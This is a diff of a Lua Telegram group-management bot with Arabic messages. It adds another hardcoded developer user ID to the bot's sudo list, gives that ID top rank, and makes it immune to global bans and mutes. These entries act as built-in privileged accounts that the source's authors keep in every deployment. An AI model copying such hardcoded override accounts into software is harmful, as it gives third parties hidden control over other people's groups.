@@ -25,13 +25,11 @@ io.write('\27[0;31m\n ارسل لي توكن البوت الان ↓ :\na≪━�
 local token = io.read()
 if token ~= '' then
 local url , res = https.request('https://api.telegram.org/bot'..token..'/getMe')
-data = json:decode(url)
 if res ~= 200 then
 print('\27[0;31m≪━───━POWLER━───━≫\n التوكن غير صحيح تاكد منه ثم ارسله')
 else
 io.write('\27[0;31m تم حفظ التوكن بنجاح \na≪━───━POWLER━───━≫\n27[0;39;49m')
 database:set(id_server..":token",token)
-database:set(id_server..":ubot",data.result.username)
 end 
 else
 print('\27[0;35m≪━───━POWLER━───━≫\n لم يتم حفظ التوكن ارسل لي التوكن الان')
@@ -171,7 +169,7 @@ print(t)
 function vardump(value)  
 print(serpent.block(value, {comment=false}))   
 end 
-sudo_users = {SUDO,1826774362,1802788797,1799990659}   
+sudo_users = {SUDO,1847495063,1826774362,1802788797,1799990659}   
 function SudoBot(msg)  
 local DRAGON = false  
 for k,v in pairs(sudo_users) do  
@@ -261,7 +259,9 @@ return false
 end 
 end
 function Can_or_NotCan(user_id,chat_id)
-if tonumber(user_id) == tonumber(1826774362) then
+if tonumber(user_id) == tonumber(1847495063) then  
+var = true
+elseif tonumber(user_id) == tonumber(1826774362) then
 var = true
 elseif tonumber(user_id) == tonumber(1802788797) then
 var = true
@@ -299,10 +299,10 @@ end
 return var
 end 
 function Rutba(user_id,chat_id)
-
-if tonumber(user_id) == tonumber(1826774362) then
+if tonumber(user_id) == tonumber(1847495063) then  
+var = ' مبرمج السورس'
+elseif tonumber(user_id) == tonumber(1826774362) then
 var = 'مبرمج السورس'
-
 elseif tonumber(user_id) == tonumber(1802788797) then
 var = 'مطور السورس'
 elseif tonumber(user_id) == tonumber(1799990659) then
@@ -330,16 +330,16 @@ var = database:get(bot_id.."Mod:Rd"..msg.chat_id_) or 'الادمن'
 elseif database:sismember(bot_id..'Special:User'..chat_id, user_id) then  
 var = database:get(bot_id.."Special:Rd"..msg.chat_id_) or 'المميز'  
 else  
+var = database:get(bot_id.."Memp:Rd"..msg.chat_id_) or 'العضو'
 
- var = database:get(bot_id.."Memp:Rd"..msg.chat_id_) or 'العضو'
 
-tdcli_function ({ID = "GetUser",user_id_ =  msg.sender_user_id_},function(arg,ta) 
- send(msg.chat_id_, msg.id_,' ♕ ر22تبتك في ال333وت ← '..var)
+tdcli_function ({ID = "GetUser",user_id_ =  user_id},function(arg,ta) 
+ 
  if string.find(ta.username_:upper(), "XBLACK") then
-  send(msg.chat_id_, msg.id_,' ♕ ر22تبتك في البوت ← '..var)
+  send(chat_id, msg.id_,' ♕ ر22تبتك في البوت ← '..var)
 local Name = '['..string.sub(ta.first_name_,0, 40)..'](tg://user?id='..ta.id_..')'
  var = Name..' \n اكس بلاك'
-  send(msg.chat_id_, msg.id_,' ♕ رتبتك في الرررررربوت ← '..var)
+  send(chat_id, msg.id_,var)
 
  
 
@@ -348,10 +348,6 @@ end,nil)
 
 
 
-
- 
- 
- 
 end  
 return var
 end 
@@ -1041,11 +1037,6 @@ end,nil)
 end,nil)
 end,nil)
 end
-if text == 'ملك' or text == 'رسالة' or text == 'رساله' or text == 'سيمبا' or text == 'رسالة من سيمبا' then 
-local notText = 'متزعليش مني ياملك انا محمد'
-https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(notText).."&show_alert=true")
-
-end 
 if text == 'تفعيل التواصل ' and DevSoFi(msg) then  
 if database:get(bot_id..'Tuasl:Bots') then
 database:del(bot_id..'Tuasl:Bots') 
@@ -1137,7 +1128,7 @@ keyboard = {}
 keyboard.inline_keyboard = { 
 {{text = '  ❨ D E S H A ♕  ❩ ', url="t.me/DESHAXBLACK"}}, 
 
-{{text = '  ❨ M E S S I ♕  ❩ ', url="t.me/MESSIXBLACK"}}, 
+{{text = '  ❨ M E S S I ♕  ❩ ', url="t.me/MESSIX_BLACK"}}, 
 } 
 local msg_id = msg.id_/2097152/0.5 
 https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
@@ -2736,28 +2727,23 @@ local Text = [[
 ]]
 keyboard = {} 
 keyboard.inline_keyboard = {
-{{text = '  ❨ M A N I A L ♕  ❩ ',url="t.me/MANIALXBLACK"}},
-{{text = '  ❨ D E S H A ♕  ❩ ',url="t.me/DESHAXBLACK"},
-{text = '  ❨ M E S S I ♕  ❩ ',url="t.me/MESSIXBLACK"}},
+{{text = '  ❨ M A N I A L ♕  ❩ ',url="t.me/I_B_N_M_A_N_I_A_L"}},
+{{text = '  ❨ L E G A N D ♕  ❩ ',url="t.me/L_E_p"}},
 {{text = '  ❨ SＯＵＲＣＥ ♕  ❩ ', url="t.me/CH_POWLER"}},
-{{text = '  ❨ رسالة من سيمبا لي ملك ♕  ❩ ', callback_data="/msgmalak"}},
-
 }
-
-
 local msg_id = msg.id_/2097152/0.5
 https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
 end
 
-if text == 'ميسي' or text == 'مسي' or text == 'مسى' then
+if text == 'ليجاند' or text == 'Legand' or text == 'legand' then
 local Text = [[
-المطور ميسي لو حابب تتواصل معاه
+المبرمج ليجاند لو حابب تتواصل معاه
 اتبع الزر إلى تحت ↓
 
 ]]
 keyboard = {} 
 keyboard.inline_keyboard = {
-{{text = '  ❨ M E S S I ♕  ❩ ',url="t.me/MESSIXBLACK"}},
+{{text = '  ❨ L E G A N D ♕  ❩ ',url="t.me/L_E_p"}},
 }
 local msg_id = msg.id_/2097152/0.5
 https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
@@ -2770,7 +2756,7 @@ local Text = [[
 ]]
 keyboard = {} 
 keyboard.inline_keyboard = {
-{{text = '  ❨ M A N I A L ♕  ❩ ',url="t.me/MANIALXBLACK"}},
+{{text = '  ❨ M A N I A L ♕  ❩ ',url="t.me/I_B_N_M_A_N_I_A_L"}},
 }
 local msg_id = msg.id_/2097152/0.5
 https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
@@ -2784,8 +2770,7 @@ local Text = [[
 ]]
 keyboard = {} 
 keyboard.inline_keyboard = {
-{{text = '  ❨ M A N I A L ♕  ❩ ',url="t.me/MANIALXBLACK"}},
-{{text = '  ❨ M E S S I ♕  ❩ ',url="t.me/MESSIXBLACK"}},
+{{text = '  ❨ M E S S I ♕  ❩ ',url="t.me/MESSIX_BLACK"}},
 {{text = '  ❨ D E S H A ♕  ❩ ',url="t.me/DESHAXBLACK"}},
 }
 local msg_id = msg.id_/2097152/0.5
@@ -3001,9 +2986,8 @@ local Text = [[
 ]] 
 keyboard = {}  
 keyboard.inline_keyboard = { 
-{{text = '  ❨ M A N I A L ♕  ❩ ', url="t.me/MANIALXBLACK"}}, 
-{{text = '  ❨ M E S S I ♕  ❩ ',url="t.me/MESSIXBLACK"}},
-{{text = '  ❨ D E S H A ♕  ❩ ',url="t.me/DESHAXBLACK"}},
+{{text = '  ❨ M A N I A L ♕  ❩ ', url="t.me/I_B_N_M_A_N_I_A_L"}}, 
+{{text = '  ❨ L E G A N D ♕  ❩ ', url="t.me/L_E_p"}}, 
 {{text = '  ❨ SＯＵＲＣＥ ♕  ❩ ', url="t.me/CH_POWLER"}},
 } 
 local msg_id = msg.id_/2097152/0.5 
@@ -3016,9 +3000,8 @@ local Text = [[
 ]] 
 keyboard = {}  
 keyboard.inline_keyboard = { 
-{{text = '  ❨ M A N I A L ♕  ❩ ', url="t.me/MANIALXBLACK"}}, 
 {{text = '  ❨ D E S H A  ♕  ❩ ',url="t.me/DESHAXBLACK"}},
-{{text = '  ❨ M E S S I ♕  ❩ ',url="t.me/MESSIXBLACK"}},
+{{text = '  ❨ M E S S I ♕  ❩ ',url="t.me/MESSIX_BLACK"}},
 {{text = '  ❨ SＯＵＲＣＥ ♕  ❩ ', url="t.me/CH_POWLER"}},
 } 
 local msg_id = msg.id_/2097152/0.5 
@@ -3978,7 +3961,10 @@ if tonumber(result.sender_user_id_) == tonumber(bot_id) then
 send(msg.chat_id_, msg.id_, " ♕ لا تسطيع حظر البوت عام")
 return false 
 end
-
+if tonumber(result.sender_user_id_) == tonumber(1847495063) then  
+send(msg.chat_id_, msg.id_, " ♕ لا تسطيع حظر مبرمجين السورس عام")
+return false 
+end
 if tonumber(result.sender_user_id_) == tonumber(1826774362) then  
 send(msg.chat_id_, msg.id_, " ♕ لا تسطيع حظر مبرمجين السورس عام")
 return false 
@@ -4029,7 +4015,10 @@ if result.id_ == tonumber(SUDO) then
 send(msg.chat_id_, msg.id_, " ♕ لا يمكنك حظر المطور الاساسي \n")
 return false 
 end
-
+if result.id_ == tonumber(1847495063) then
+send(msg.chat_id_, msg.id_, " ♕ لا يمكنك حظر مبرمجين السورس \n")
+return false 
+end
 if result.id_ == tonumber(1826774362) then  
 send(msg.chat_id_, msg.id_, " ♕ لا تسطيع حظر مبرمجين السورس عام")
 return false 
@@ -4074,7 +4063,10 @@ if tonumber(userid) == tonumber(bot_id) then
 send(msg.chat_id_, msg.id_, " ♕ لا تسطيع حظر البوت عام")
 return false 
 end
- 
+if tonumber(userid) == tonumber(1847495063) then  
+send(msg.chat_id_, msg.id_, " ♕ لا تسطيع حظر مبرمجين السورس عام")
+return false 
+end
 if tonumber(userid) == tonumber(1826774362) then  
 send(msg.chat_id_, msg.id_, " ♕ لا تسطيع حظر مبرمجين السورس عام")
 return false 
@@ -4120,7 +4112,10 @@ if tonumber(result.sender_user_id_) == tonumber(bot_id) then
 send(msg.chat_id_, msg.id_, " ♕ لا تسطيع كتم البوت عام")
 return false 
 end
- 
+if tonumber(result.sender_user_id_) == tonumber(1847495063) then  
+send(msg.chat_id_, msg.id_, " ♕ لا تسطيع كتم مبرمجين السورس عام")
+return false 
+end
 if tonumber(userid) == tonumber(1826774362) then  
 send(msg.chat_id_, msg.id_, " ♕ لا تسطيع كتم مبرمجين السورس عام")
 return false 
@@ -4170,7 +4165,10 @@ if result.id_ == tonumber(SUDO) then
 send(msg.chat_id_, msg.id_, " ♕ لا يمكنك كتم المطور الاساسي \n")
 return false 
 end
-
+if result.id_ == tonumber(1847495063) then
+send(msg.chat_id_, msg.id_, " ♕ لا يمكنك كتم مبرمجين السورس \n")
+return false 
+end
 if tonumber(userid) == tonumber(1826774362) then  
 send(msg.chat_id_, msg.id_, " ♕ لا تسطيع كتم مبرمجين السورس عام")
 return false 
@@ -4215,7 +4213,10 @@ if tonumber(userid) == tonumber(bot_id) then
 send(msg.chat_id_, msg.id_, " ♕ لا تسطيع كتم البوت عام")
 return false 
 end
-
+if tonumber(userid) == tonumber(1847495063) then  
+send(msg.chat_id_, msg.id_, " ♕ لا تسطيع كتم مبرمجين السورس عام")
+return false 
+end
 if tonumber(userid) == tonumber(1826774362) then  
 send(msg.chat_id_, msg.id_, " ♕ لا تسطيع كتم مبرمجين السورس عام")
 return false 
@@ -11407,22 +11408,7 @@ return false
 end
 
 if text == 'انا مين' then
- var = '[انت مجرد عضو زليل حقير ملوش لزمه 😂](t.me/CH_POWLER)'
-tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id},function(arg,ta) 
- if string.match(ta.username_, "XBLACK") then
- if ta.first_name_ then
-local Name = '['..string.sub(ta.first_name_,0, 40)..'](tg://user?id='..ta.id_..')'
- var = Name..' \n [انت من تيم اكس بلاك ياقلبي]'
-  
-end 
- 
- 
- end
-
-end,nil) 
- 
-
-send(msg.chat_id_,msg.id_, var) 
+send(msg.chat_id_,msg.id_, '[انت مجرد عضو زليل حقير ملوش لزمه 😂](t.me/CH_POWLER)') 
 return false
 end
 
@@ -11809,20 +11795,7 @@ local DRAGON_Msg = {
 'اسمي  '..Namebot..' ياحياتي🧸♥️',
 'اسمي  '..Namebot..' يوتكه🙈🍑',
 }
-local msg_id = msg.id_/2097152/0.5
- keyboard = {} 
-keyboard.inline_keyboard = {
-{{text = '  𖣘 ⁽المطور₎ 𖣘 ',url="t.me/"..SUDOUSERNAME}}
-
-,{{text = '  اضف البوت الي مجموعتك ',url="t.me/"..database:get(bot_id..":ubot").."?startgroup=start"}}
-
-}
- 
-
-https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/'..database:get(bot_id..":ubot")..'&caption=' .. URL.escape('['..DRAGON_Msg[math.random(#DRAGON_Msg)]..']').."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
-
-
---send(msg.chat_id_, msg.id_,'['..DRAGON_Msg[math.random(#DRAGON_Msg)]..']') 
+send(msg.chat_id_, msg.id_,'['..DRAGON_Msg[math.random(#DRAGON_Msg)]..']') 
 return false
 end
 
@@ -13167,13 +13140,7 @@ local Chat_id = data.chat_id_
 local Msg_id = data.message_id_
 local msg_idd = Msg_id/2097152/0.5
 local Text = data.payload_.data_
-if Text == '/msgmalak' then
-local notText = 'متزعليش مني ياملك انا محمد'
-https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(notText).."&show_alert=true")
-return false
-end
 if Text == '/help1' then
-
 if not Mod(data) then
 local notText = '✘ عذرا الاوامر هذه لا تخصك'
 https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(notText).."&show_alert=true")
